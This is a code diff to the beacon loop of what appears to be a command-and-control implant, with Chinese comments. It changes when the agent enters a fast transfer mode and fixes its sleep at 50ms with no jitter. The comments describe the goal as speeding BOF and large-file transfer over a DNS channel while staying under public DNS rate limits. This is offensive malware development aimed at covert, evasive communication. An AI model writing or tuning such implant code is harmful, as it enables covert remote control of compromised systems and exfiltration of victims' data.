@@ -376,17 +376,21 @@ void AgentMain()
 			ULONG jitter    = g_Agent->config->jitter_delay;
 
 			BOOL burst = FALSE;
-			// 阈值 512KB：认为正在传输大任务
-			if ((g_Connector->GetLastUpTotal() >= (512 * 1024)) || (g_Connector->GetLastDownTotal() >= (512 * 1024))) {
+			// 阈值 1KB 或 Connector 正忙于重组分片：进入加速模式
+			// IsBusy() 确保了即使是小于 1KB 但被切分的小下行任务，也能连续快速拉取，而不需要等待长 Sleep。
+			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
 				burst = TRUE;
 			}
 
 			if (burst) {
-				// 以 baseSleep/2 作为 "最大值"，交给 WaitMask 结合 jitter 产生 0~0.5 倍基础 sleep 的等待
-				ULONG halfSleep = baseSleep / 2;
-				if (halfSleep == 0)
-					halfSleep = baseSleep;
-				WaitMask(g_Agent->GetWorkingSleep(), halfSleep, jitter);
+				// 加速模式：强制将 sleep 限制在 50ms 以内，以实现连续快速传输（约 10-15 QPS）。
+				// 这既能显著加快 BOF/大文件传输速度，又通过 50ms 间隔保持在公共 DNS 的安全限流阈值内。
+				ULONG burstSleep = 50;
+				if (baseSleep < burstSleep)
+					burstSleep = baseSleep;
+				
+				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0); // jitter 设为 0 以保持稳定速率
+				
 				// 用完一轮后清零统计，后续再根据新一轮大任务重新进入 burst
 				g_Connector->ResetTrafficTotals();
 			} else {
